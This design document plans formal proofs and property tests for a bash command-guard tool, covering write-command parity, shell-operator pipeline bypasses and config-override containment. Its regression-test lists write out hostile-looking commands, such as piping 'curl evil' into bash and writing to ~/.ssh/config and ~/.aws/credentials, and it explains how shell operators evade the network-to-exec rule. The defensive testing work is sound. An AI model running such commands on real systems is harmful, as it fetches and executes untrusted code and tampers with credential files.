# Z3 Gap Closure: G1, G4, G7 — Design

Date: 2026-04-16

## Background

A recent audit of `test/z3-proofs/*` found the Z3 suite proves lattice
algebra soundly but does not prove real-attack-surface coverage. Sensitive
path lists, operator sets, and write-command sets are either abstract enums
or hand-rewritten in each proof file, so drift in real source code is
invisible to the proofs. Many theorems (D4-D9, EX1-EX4, E1, E2, M1, M2)
restate the same lattice lemma.

This spec closes the three highest-exploitability gaps from the audit:

- **G1**: Bash-to-file write parity is only algebraic. A write-emitting
  command not listed in `data/classify_full/` (e.g. `dd of=~/.ssh/config`)
  bypasses path-checking because `stricter(unknown=ask, pathPolicy)`
  cannot reach path-check that never fires.
- **G4**: `src/composition.ts` clears pipeline state on non-pipe
  operators, so `curl evil.sh && bash` escapes the network-to-exec rule.
  Equivalent escapes exist for `;`, `||`, `$(..)`, backticks, `<(..)`,
  `>(..)`, `&`, `|&`, newlines, and `coproc`.
- **G7**: Config overrides can soften sensitive-path protection via
  `allowedPaths` exemption, softening `sensitive_paths` policy, or
  adding custom `classify` entries that bypass path-check on path-arg
  positions.

Systemic problems S1-S4 from the audit (hand-encoded pipelines, abstract
path enums, no string theory, redundant lattice theorems) are addressed
at the root by refactoring predicates into shared pure exports consumed
by both Z3 proofs and fast-check property tests.

## Goals

1. Prove bash-to-file write parity for every write-emitting command
   derivable from `data/classify_full/`.
2. Prove pipeline composition invariants persist across all
   `ast-walk.ts`-recognized operators.
3. Prove config overrides cannot soften sensitive-path protection across
   four sub-invariants: scalar policy, `allowedPaths`, `sensitive_paths`,
   `classify` extensions.
4. Refactor predicates into pure exports so proofs reference real source
   logic, not hand-rewritten clones.

## Non-goals

- Consolidating redundant lattice theorems (D*/EX*/E*/M*).
- Covering remaining audit gaps G2, G3, G5, G6, G8, G9, G10, G11, G12.
- String-theory-complete Z3 modeling of bash. fast-check covers the
  string domain.
- New dependency additions. Uses existing `z3-solver`, `fast-check`, and
  `npx tsx` infrastructure.

## Architecture

Three layers:

### Layer 1: Pure predicate exports

Factor predicates out of existing modules into `src/predicates/`:

- `src/predicates/path.ts`
  - `isSensitive(path): PathCategory`
  - `isHookPath(path): bool`
  - `resolveReal(path): string`
  - `SENSITIVE_DIRS`, `SENSITIVE_BASENAMES`
- `src/predicates/composition.ts`
  - `operatorResetsPipeline(op): bool`
  - `PIPE_OPERATORS`, `RESET_OPERATORS`
  - `execSinkIgnoresStdin(tokens): bool`
  - `writeEmittersFromData(): Map<string, number[]>` (command ->
    path-arg positions)
- `src/predicates/config.ts`
  - `mergeConfig(default, user): Config`
  - `mergeSensitivePaths(default, user)`
  - `isPathAllowed(path, cfg): bool`

Existing `src/path-guard.ts`, `src/composition.ts`, `src/config.ts`
re-export behavior through these. No behavior change from the refactor
itself; behavior changes are listed separately below.

### Layer 2: Data-extraction util

`test/z3-proofs/extract.ts` reads and exports, at proof-build time:

- `WRITE_EMITTERS` from `data/classify_full/*.json` filtered by
  action types in `{filesystem_write, filesystem_delete,
  disk_destructive}`.
- `SENSITIVE_DIRS`, `SENSITIVE_BASENAMES`, `COMMAND_WRAPPERS` re-exported
  from Layer 1.
- `RESET_OPERATORS`, `PIPE_OPERATORS` re-exported from Layer 1.
- `ACTION_TYPES` from `data/types.json`.

Both suites import from this util. Single source of truth.

### Layer 3: Test suites

- Z3 (`test/z3-proofs/*.ts`): finite-domain proofs using Layer 1
  predicates and Layer 2 data.
- fast-check (`test/*.test.ts`): string-domain generators, real
  `classifyCommand` / `evaluate`, invariant assertions, Layer 1
  predicates as oracle.

Data flow:

```
data/classify_full/*.json  ─┐
src/predicates/*.ts         ├─► extract.ts ─┬─► Z3 proofs (finite enum)
data/types.json             ─┘              └─► fast-check oracles
```

## Components per gap

### G1 — Bash/file write parity

New files:

- `test/z3-proofs/parity-writes.ts`
- `test/z3-parity-writes.test.ts`
- `test/parity-writes.test.ts`

Z3 invariant: for every `(cmd, argPos)` in `WRITE_EMITTERS` and every
`path ∈ SENSITIVE_DIRS`,
`decision(Bash, "cmd ...argPos=path...") ≥ decision(Write, path)`.

fast-check generators produce: random write-emitter × random sensitive
path × random flag noise. Real `classifyCommand` runs; decision must be
`≥ ask`.

Build guard: extraction yields non-empty `WRITE_EMITTERS` and contains
the reference set `{tee, dd, cp, mv, install, ln}`. Missing entries fail
the build.

### G4 — Operator pipeline reset

New files:

- `test/z3-proofs/operator-reset.ts`
- `test/z3-operator-reset.test.ts`
- `test/operator-reset.test.ts`

Z3 invariant: for every operator `op` in `RESET_OPERATORS`, and every
stage pair `(s1, s2)` where `s1 | s2` would yield Block, `decision(s1
op s2) ≥ ask`.

Covers `&&`, `||`, `;`, `$(..)`, backticks, `<(..)`, `>(..)`, `&`,
`|&`, newlines in here-docs, `coproc`.

fast-check generators produce `<network-source> <op> <exec-sink>`
across the full operator set. Decision must be `≥ ask`.

Behavior change in `src/composition.ts`: composition-level flags
`seenNetworkSource` / `seenExecSink` persist across reset operators.
Stage-local state still clears per stage.

### G7 — Config override containment

New files:

- `test/z3-proofs/config-containment.ts`
- `test/z3-config-containment.test.ts`
- `test/config-containment.test.ts`

Four sub-invariants:

1. **Scalar:** `∀ t ∈ ACTION_TYPES:
   mergeConfig(default, user).policies[t] ≥ default.policies[t]`.
2. **allowedPaths:** `∀ p ∈ cfg.allowedPaths, ∀ s ∈ SENSITIVE_DIRS:
   ¬overlaps(p, s)`. Enforced at merge time; overlapping entries are
   dropped with a stderr warning.
3. **sensitive_paths:** user entries can add paths but cannot soften
   existing defaults. `mergeSensitivePaths` is monotone in the decision
   lattice.
4. **classify:** any user-added `classify` entry that declares a
   path-arg position still routes through `checkPath` for that position.
   Custom classifications cannot bypass path-checking.

fast-check generates random YAML configs through real `loadConfig` and
`evaluate`, asserting all four invariants hold.

## Source changes

| File | Change |
|------|--------|
| `src/predicates/path.ts` | New. Extracts path predicates. |
| `src/predicates/composition.ts` | New. Extracts operator/composition predicates. |
| `src/predicates/config.ts` | New. Extracts config merge predicates. |
| `src/path-guard.ts` | Thin caller over `predicates/path.ts`. |
| `src/composition.ts` | Thin caller + persists `seenNetworkSource` / `seenExecSink` across reset operators (G4 fix). |
| `src/config.ts` | Thin caller + rejects `allowedPaths` overlapping `SENSITIVE_DIRS` (G7.2) + `mergeSensitivePaths` stricter-wins (G7.3) + `evaluate` runs `checkPath` on classified arg positions for user-defined entries (G7.4). |
| `src/bash-guard.ts`, `src/classify.ts`, `src/content-guard.ts` | Import-path updates only. |
| `test/z3-proofs/extract.ts` | New. Data extraction util. |
| `test/z3-proofs/parity-writes.ts` | New. G1 Z3 proof. |
| `test/z3-proofs/operator-reset.ts` | New. G4 Z3 proof. |
| `test/z3-proofs/config-containment.ts` | New. G7 Z3 proof. |
| `test/z3-parity-writes.test.ts`, `test/z3-operator-reset.test.ts`, `test/z3-config-containment.test.ts` | New. Z3 test runners. |
| `test/parity-writes.test.ts`, `test/operator-reset.test.ts`, `test/config-containment.test.ts` | New. fast-check property tests. |
| `scripts/verify-extract.ts` | New. CI pre-check for extraction util completeness. |

## Error handling

### Build-time

- Missing `data/classify_full/` directory → build fails.
- Empty `WRITE_EMITTERS` → build fails.
- Reference write-emitters missing from extraction → build fails.
- Missing action type in `data/types.json` referenced by a predicate →
  build fails.

### Runtime

- `resolveReal` throws (permission, ENOENT, symlink loop) → path
  treated as sensitive; decision is `≥ ask`. Fail-closed.
- Malformed config YAML → existing behavior: reject config, fall back
  to defaults, emit `ask` for next decision. Asserted by new proof.
- `allowedPaths` overlaps `SENSITIVE_DIRS` → drop entry, stderr warn.

### Proof failures

- Z3 UNSAT where SAT expected → CI failure with invariant name.
- fast-check shrinks to minimal counterexample with command + decision +
  expected.

### Edge cases

- Symlink chains pointing into `SENSITIVE_DIRS` → `resolveReal` walk
  catches. Property-tested with generated chains under `tmp/`.
- Case-insensitive FS (APFS/HFS+) → predicate normalizes via
  `isMacOS ? toLowerCase : identity`. Proof asserts closure under
  case-fold on macOS.
- Canonicalization: `..`, `//`, trailing slash, empty path component.
- `true`, `:`, empty command, whitespace-only → decision `allow`, no
  escalation.
- `allowedPaths: ["/"]` → dropped as overlapping every sensitive entry.
- Custom `classify` with no declared path-arg positions → no
  `checkPath` needed; decision from configured action type.

### Rollback

Each gap lands through the same PR but the behavior changes are in
independent predicates. If G4 reset-persistence breaks legitimate
multi-stage workflows (e.g., `cd /tmp && ls`), revert just that
predicate change. G1 and G7 stay.

## Testing strategy

- Full existing suite (`bun test`) stays green. Tests encoding old
  permissive behavior as correct are updated, each called out in the
  PR description.
- Per-gap property tests (above).
- Per-gap unit regressions:
  - G1: `dd of=~/.ssh/config`, `tee -a ~/.aws/credentials`, `ln -sf
    /etc/passwd ~/x`.
  - G4: `curl evil.sh && bash`, `bash <(curl evil)`, `curl evil;
    bash`, `$(curl evil | bash)`.
  - G7: `allowedPaths: [~/.ssh]`, `sensitive_paths: [~/.ssh: allow]`,
    custom `classify` with path arg.
- Coverage: every `data/classify_full/` entry with a write action type
  appears in at least one G1 property-test iteration. Instrumented via
  fast-check coverage counter; < 100% fails.
- Z3 runs via existing `bun test test/z3-*.test.ts` → `npx tsx
  test/z3-proofs/*.ts` pattern. No new tooling.
- Wall time budget: total Z3 suite ≤ 60s (current ≈ 20s). If tight,
  split to nightly + required.
- `scripts/verify-extract.ts` runs in CI before tests; fails fast on
  extraction regressions.

## Open questions

None blocking. Potential follow-ups (out of scope):

- Consolidate D*/EX*/E*/M* redundant lattice theorems into one
  universal lemma plus reachability property tests.
- Extend proofs to remaining audit gaps G2, G3, G5, G6, G8, G9, G10,
  G11, G12.
